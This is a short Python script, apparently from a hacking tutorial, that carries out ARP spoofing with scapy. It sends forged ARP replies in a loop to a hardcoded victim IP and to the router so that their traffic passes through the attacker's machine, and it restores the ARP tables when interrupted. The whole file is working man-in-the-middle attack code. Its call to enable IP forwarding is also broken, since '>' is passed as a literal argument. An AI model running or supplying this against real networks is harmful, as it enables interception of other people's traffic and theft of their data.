#!/usr/bin/env python

import sys
import time
import scapy.all as scapy
import subprocess
from sshuttle.helpers import verbose

def get_mac(ip):
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")            # Ethernet frame
    arp_request = scapy.ARP(pdst=ip)                            # ARP packet
    arp_request_broadcast = broadcast/arp_request               # put ARP packet inside Ethernet-frame ## '/' is appending
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)   # send and receive
    return answered[0][1].hwsrc

# op=2  ==> creating an ARP response ==> meaning: redirect the flow of packets trough ower computer (1: request, 2: response)
# pdst  ==> <target IP>
# hwdst ==> <target MAC>
# psrc  ==> <router IP>
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# IP Forwarding
subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

# we're telling the victim  that we are the router,
# and otherwise we're telling the router that we are the victim
# it wil  update the ARP table of the target
target_ip = "192.168.0.135"
router_ip = "192.168.0.1"
packet_count = 0
try:
    while True:
        spoof(router_ip, target_ip)  # Router
        spoof(target_ip, router_ip)  # Target
        packet_count = packet_count + 2
        print("\r[+] Packets sent: " +  str(packet_count),  end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ...... Restoring.")
    restore(router_ip, target_ip)
    restore(target_ip, router_ip)
    subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])